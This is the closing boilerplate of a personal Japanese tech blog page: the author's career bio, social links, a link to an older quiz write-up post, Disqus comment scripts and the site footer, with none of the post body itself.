        2014年4月に株式会社ディー・エヌ・エーにエンジニアスペシャリストとして入社し、ソーシャルゲームのサーバサイド共通基盤の開発に従事。<br>
        2016年8月より、オンライン証券会社<a target="_blank" rel="noopener" href="https://folio-sec.com">株式会社FOLIO</a>に入社。バックエンドシステム開発・プロジェクトマネージメント・Engineering
        Managementに従事。<br>
        2020年3月より<a target="_blank" rel="noopener" href="https://idein.jp">Idein株式会社</a>所属。デバイス・高性能計算関連の研究開発。<br>
        2021年9月よりトヨタ自動車株式会社所属。自動車データの収集〜分析基盤の研究開発に従事。<br>
        その他個人事業主として、RDBMS開発やIntel SGXを利用するためのライブラリ開発などの活動。
      </p>
      <ul class="author-social-buttons">
        <li class="author-social-button"><a class="fa fa-lg fa-twitter-square" target="_blank" rel="noopener" href="https://twitter.com/laysakura"></a>
        </li>
        <li class="author-social-button"><a class="fa fa-lg fa-github-square" target="_blank" rel="noopener" href="https://github.com/laysakura"></a>
        </li>
        <li class="author-social-button"><a class="fa fa-lg fa-facebook-square"
            target="_blank" rel="noopener" href="https://www.facebook.com/lay.sakura"></a></li>
      </ul>
    </div>
  </footer>
  
  
  
<nav id="article-nav">
  
  
    <a href="/2024/01/10/flatt-security-developers-quiz-6/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">
        
          Writeup - Flatt Security Developers&#39; Quiz ＃6
        
      </div>
    </a>
  
</nav>

  
</article>




<section id="comments">
  <div id="disqus_thread">

    <!-- comment service provided by disqus -->
    <script>
      /**
       *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
       *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
       */
      var disqus_config = function () {
        this.page.url = https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/;  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
      };
      (function () {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');

        s.src = '//laysakura.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      })();
    </script>

    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
        Disqus.</a></noscript>
  </div>
</section>


    </div>
    <div class="mb-search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:laysakura.github.io">
  </form>
</div>
<footer id="footer">
	<h1 class="footer-blog-title">
		<a href="/">俺とお前とlaysakura</a>
	</h1>
	<span class="copyright">
		&copy; 2024 Sho Nakatani a.k.a. laysakura<br>
		Modify from <a href="https://sanographix.github.io/tumblr/apollo/" target="_blank">Apollo</a> theme, designed by <a href="https://www.sanographix.net/" target="_blank">SANOGRAPHIX.NET</a><br>
		Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
	</span>
</footer>

    
<script>
  var disqus_shortname = 'laysakura';
  
  var disqus_url = 'https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//go.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>



<script src="/js/script.js"></script>

  </div>

  <!-- https://github.com/vfeskov/vanilla-back-to-top -->
  <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
  <script>addBackToTop({
    diameter: 50,
    backgroundColor: '#33a6b880',
    textColor: '#fff'
  })</script>

</body>
</html>
